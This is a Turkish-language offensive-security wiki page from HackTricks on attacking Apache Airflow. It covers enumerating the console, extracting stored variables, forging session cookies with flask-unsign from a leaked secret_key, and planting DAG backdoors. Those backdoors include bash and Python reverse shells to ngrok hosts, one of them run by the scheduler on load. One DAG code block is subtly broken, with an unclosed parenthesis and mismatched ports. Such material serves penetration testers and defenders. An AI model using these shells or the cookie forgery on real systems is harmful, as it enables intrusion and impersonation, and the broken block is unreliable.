# Apache Airflow Güvenliği

<details>

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel Bilgiler

[**Apache Airflow**](https://airflow.apache.org), **veri boru hatları veya iş akışlarını düzenleme ve zamanlama** platformu olarak hizmet verir. Veri boru hatları bağlamında "düzenleme" terimi, çeşitli kaynaklardan gelen karmaşık veri iş akışlarını düzenleme, koordine etme ve yönetme sürecini ifade eder. Bu düzenlenmiş veri boru hatlarının temel amacı işlenmiş ve tüketilebilir veri kümelerini sunmaktır. Bu veri kümeleri, iş zekası araçları, veri bilimi ve makine öğrenme modelleri de dahil olmak üzere birçok uygulama tarafından yaygın bir şekilde kullanılmaktadır ve tüm bunlar büyük veri uygulamalarının işleyişinde temel rol oynamaktadır.

Temelde, Apache Airflow size **bir şey olduğunda** (olay, cron) **kodun yürütülmesini zamanlamayı** sağlayacaktır.

## Yerel Laboratuvar

### Docker-Compose

Tam bir apache airflow docker ortamını başlatmak için **docker-compose yapılandırma dosyasını** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) kullanabilirsiniz. (MacOS'ta iseniz, docker VM'ye en az 6GB RAM verdiğinizden emin olun).

### Minikube

Apache airflow'ı çalıştırmanın kolay bir yolu, **minikube ile çalıştırmaktır**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Yapılandırması

Airflow, yapılandırmasında **duyarlı bilgileri** saklayabilir veya zayıf yapılandırmalar bulabilirsiniz:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflow'u saldırmadan önce **izinlerin nasıl çalıştığını** anlamanız gerekmektedir:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Saldırılar

### Web Konsolu Numaralandırma

Eğer **web konsoluna erişiminiz varsa**, aşağıdaki bilgilerin bazılarına veya tümüne erişebilirsiniz:

* **Değişkenler** (Özel duyarlı bilgiler burada saklanabilir)
* **Bağlantılar** (Özel duyarlı bilgiler burada saklanabilir)
* Onlara `http://<airflow>/connection/list/` adresinden erişin
* [**Yapılandırma**](./#airflow-configuration) (Gizli bilgiler, **`secret_key`** ve şifreler burada saklanabilir)
* Kullanıcıları ve rolleri listele
* **Her DAG'ın kodu** (ilginç bilgiler içerebilir)

### Değişken Değerlerini Almak

Değişkenler Airflow'da saklanabilir, böylece **DAG'lar** değerlerine **erişebilir**. Diğer platformların sırlarına benzer. Yeterli **izinlere** sahipseniz, bunlara GUI'de `http://<airflow>/variable/list/` adresinden erişebilirsiniz.\
Airflow varsayılan olarak değişkenin değerini GUI'de gösterecektir, ancak [**bu**](https://marclamberti.com/blog/variables-with-apache-airflow/) bağlantıya göre, GUI'de **değerinin** **yıldızlar** olarak görüneceği **değişkenlerin listesini** ayarlamak mümkündür.

![](<../../.gitbook/assets/image (164).png>)

Ancak, bu **değerler** hala **CLI** (DB erişimine ihtiyacınız var), **keyfi DAG** yürütme, **API**'ye değişkenler uç noktasına erişim (API etkinleştirilmelidir) ve **GUI**'den bile **alınabilir**.\
Bu değerlere GUI'den erişmek için sadece erişmek istediğiniz değişkenleri **seçin** ve **Eylemler -> Dışa Aktar**'a tıklayın.\
Başka bir yol, **gizli değeri** almak için **arama filtresini** kullanarak **kaba kuvvet** uygulamaktır:

![](<../../.gitbook/assets/image (152).png>)

### Yetki Yükseltme

Eğer **`expose_config`** yapılandırması **True** olarak ayarlanmışsa, **Kullanıcı** rolünden ve **yukarısından** olanlar **webdeki yapıyı okuyabilir**. Bu yapılandırmada, **`secret_key`** görünür, bu da demektir ki bu geçerli olan herhangi bir kullanıcı, **kendi imzalı çerezini oluşturarak başka herhangi bir kullanıcı hesabını taklit edebilir**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Arka Kapısı (Airflow işçisinde RCE)

Eğer **DAG'ların kaydedildiği yere** **yazma erişiminiz** varsa, sadece size bir **ters kabuk gönderecek bir tane oluşturabilirsiniz.**\
Bu ters kabuğun bir **airflow işçisi konteyneri içinde** yürütüleceğini unutmayın:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Arka Kapısı (Airflow zamanlayıcısında Uzaktan Kod Çalıştırma)

Eğer bir şeyin **kodun kökünde çalıştırılacak şekilde ayarlanırsa**, bu yazının hazırlandığı sırada, bunun **DAG klasörüne yerleştirildikten birkaç saniye sonra zamanlayıcı tarafından çalıştırılacağı** unutulmamalıdır.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG Oluşturma

Eğer **DAG kümesi içinde bir makine ele geçirirseniz**, `dags/` klasöründe yeni **DAG betikleri** oluşturabilir ve bu betikler **DAG kümesi içindeki diğer makinelerde çoğaltılacaktır**.

### DAG Kod Enjeksiyonu

GUI'den bir DAG'ı çalıştırdığınızda ona **argümanlar geçirebilirsiniz**.\
Bu nedenle, DAG uygun şekilde kodlanmamışsa **Komut Enjeksiyonuna açık olabilir**.\
Bu, bu CVE'de meydana gelen şeydir: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

**DAG'larda komut enjeksiyonlarını aramaya başlamak için bilmeniz gereken tek şey**, **parametrelerin** kodla **`dag_run.conf.get("param_name")`** şeklinde **erişildiğidir**.

Ayrıca, aynı zafiyet **değişkenlerle** de meydana gelebilir (unutmayın ki yeterli izinlerle GUI'de **değişkenlerin değerini kontrol edebilirsiniz**). Değişkenlere **şu şekilde erişilir**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Eğer örneğin bir bash komutu içinde kullanılıyorlarsa, bir komut enjeksiyonu gerçekleştirebilirsiniz.

<details>

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
